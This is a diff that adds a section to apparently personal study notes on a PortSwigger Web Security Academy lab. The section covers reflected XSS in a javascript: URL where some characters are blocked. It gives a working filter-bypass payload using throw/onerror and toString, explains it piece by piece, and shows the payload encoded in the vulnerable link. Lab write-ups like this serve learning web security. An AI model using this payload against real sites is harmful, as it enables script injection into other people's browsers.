@@ -803,6 +803,39 @@ document.write('<img src="/resources/images/tracker.gif?searchTerms='+encodeURIC
 
 Whatever you write behind the alert(), it blocks with /' all the time,
 so that comment with //                    
+__________________________________________________________________________________________________________________________________________________________________
+Reflected XSS in a JavaScript URL with some characters blocked
+---------------------------------------------------------------
+
+
+
+***When postid or id is in fetch API. You can use WAF bypass payload.***
+
+
+<a href="javascript:fetch('/analytics', {method:'post',body:'/post%3fpostId%3d2'}).finally(_ => window.location = '/')">Back to Blog</a>
+
+https://0a470038034ad0ef80cdda2e0079005b.web-security-academy.net/post?postId=5&'},x=x=>{throw/**/onerror=alert,document.domain},toString=x,window+'',{x:'
+
+
+&': This seems to be a closing of an HTML attribute or a part of an HTML element, typically used in HTML injection attacks.
+
+},x=x=>{throw/**/onerror=alert,1337}: This is defining a function x that throws an error, triggering the onerror event. The onerror event is assigned to call the alert function with 1337 as its argument.
+
+toString=x: This is setting the toString method to be the function x defined earlier.
+
+window+'',{x:': This is creating an object with a property x containing an empty string. 
+
+throw is the statement doesn't have a return value, thefore cannot be passed as an argument to the fetch API, thats' why we have to use toString method to call function.
+										
+You have to encode that code and paste behind the parameter value --> &'},x=x=>{throw/**/onerror=alert,document.domain},toString=x,window+'',{x:'
+
+In inspect mode
+---------------
+<div class="is-linkback">
+         <a href="javascript:fetch('/analytics', {method:'post',body:'/post%3fpostId%3d2%26%27},x%3dx%3d%3e{throw/**/onerror%3dalert,document.domain},toString%3dx,window%2b%27%27,{x%3a%27'}).finally(_ => window.location = '/')">Back to Blog</a>
+</div>
+
+That was in linback class, so that when you click return back or return to block link > it will trigger document.domain.
 
 
 
